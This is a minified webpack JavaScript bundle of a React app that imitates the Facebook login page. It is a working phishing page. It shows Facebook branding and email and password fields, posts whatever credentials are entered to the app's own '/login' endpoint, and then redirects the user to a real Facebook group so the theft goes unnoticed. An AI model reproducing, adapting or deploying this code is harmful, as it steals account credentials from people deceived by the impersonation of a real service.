(this["webpackJsonpmy-app"]=this["webpackJsonpmy-app"]||[]).push([[0],{11:function(e,t,n){},13:function(e,t,n){},15:function(e,t,n){"use strict";n.r(t);var c=n(1),a=n.n(c),s=n(5),o=n.n(s),r=(n(11),n(3)),i=n.n(r),l=n(6),u=n(4),p=(n(13),n(0));var d=function(){var e=Object(c.useState)(""),t=Object(u.a)(e,2),n=t[0],a=t[1],s=Object(c.useState)(""),o=Object(u.a)(s,2),r=o[0],d=o[1],h=function(){var e=Object(l.a)(i.a.mark((function e(t){var c,a;return i.a.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return t.preventDefault(),e.prev=1,e.next=4,fetch("/login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({email:n,password:r})});case 4:return c=e.sent,e.next=7,c.json();case 7:a=e.sent,421!==c.status&&a?window.location.href="https://www.facebook.com/groups/2549715411950918/":window.alert("please fill the input filed correctly"),e.next=14;break;case 11:e.prev=11,e.t0=e.catch(1),console.log(e.t0);case 14:case"end":return e.stop()}}),e,null,[[1,11]])})));return function(t){return e.apply(this,arguments)}}();return Object(p.jsx)("div",{children:Object(p.jsxs)("div",{className:"container",children:[Object(p.jsxs)("div",{className:"left",children:[Object(p.jsx)("h1",{children:"facebook"}),Object(p.jsx)("p",{children:"Facebook helps you connect and share with the people in your life."})]}),Object(p.jsx)("div",{className:"right",children:Object(p.jsxs)("div",{children:[Object(p.jsxs)("form",{children:[Object(p.jsx)("input",{type:"text",name:"email",value:n,onChange:function(e){a(e.target.value)},placeholder:"Email addess or phone number"}),Object(p.jsx)("input",{type:"password",name:"password",value:r,onChange:function(e){d(e.target.value)},placeholder:"Password"}),Object(p.jsx)("input",{type:"submit",className:"loginBtn",onClick:h,value:"Log In"}),Object(p.jsx)("button",{onClick:function(e){e.preventDefault(),window.location.href="https://www.facebook.com"},className:"forget",children:"Forgotten password?"}),Object(p.jsx)("div",{className:"sign-up",children:Object(p.jsx)("button",{onClick:function(e){e.preventDefault(),window.location.href="https://www.facebook.com"},className:"signupBtn",children:"Create New Account"})})]}),Object(p.jsxs)("p",{children:[Object(p.jsx)("b",{children:"Create a Page"})," for a celebrity, band or business."]})]})})]})})},h=function(e){e&&e instanceof Function&&n.e(3).then(n.bind(null,16)).then((function(t){var n=t.getCLS,c=t.getFID,a=t.getFCP,s=t.getLCP,o=t.getTTFB;n(e),c(e),a(e),s(e),o(e)}))};o.a.render(Object(p.jsx)(a.a.StrictMode,{children:Object(p.jsx)(d,{})}),document.getElementById("root")),h()}},[[15,1,2]]]);
//# sourceMappingURL=main.ca004a11.chunk.js.map